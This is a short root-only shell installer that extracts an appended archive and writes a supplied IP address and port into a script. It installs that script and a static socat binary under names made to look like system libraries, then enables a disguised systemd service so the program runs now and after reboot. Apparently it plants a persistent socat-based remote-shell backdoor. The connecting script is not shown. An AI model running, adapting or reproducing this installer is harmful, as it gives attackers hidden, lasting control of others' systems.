#!/bin/sh
[ "$(id -u)" -ne 0 ] && echo root is required && exit 1
[ -z "$2" ] && echo needs argument IP and PORT && exit 1
offset=TARBALL_OFFSET
temp=$(mktemp -d)
cp "$0" "$temp"/install.sh
cd "$temp" || exit
tail -n +$offset install.sh > tarball.tar
tar xf tarball.tar
chmod +x linuxd.sh
sed -i "s,IP_ADDRESS,$1," linuxd.sh
sed -i "s,PORT,$2," linuxd.sh
mv linuxd.sh /usr/lib/linuxd
mv socat-static /usr/lib/linuxd.so
mv undo.sh /usr/lib/linuxd.so.1
mv systemd-linuxd.service /usr/lib/systemd/system/systemd-linuxd.service
systemctl --system daemon-reload
systemctl --system enable /usr/lib/systemd/system/systemd-linuxd.service --now
rm -rf "$temp"
echo "Success"
[ "$3" = 'reboot' ] && echo "Rebooting" && systemctl reboot
exit
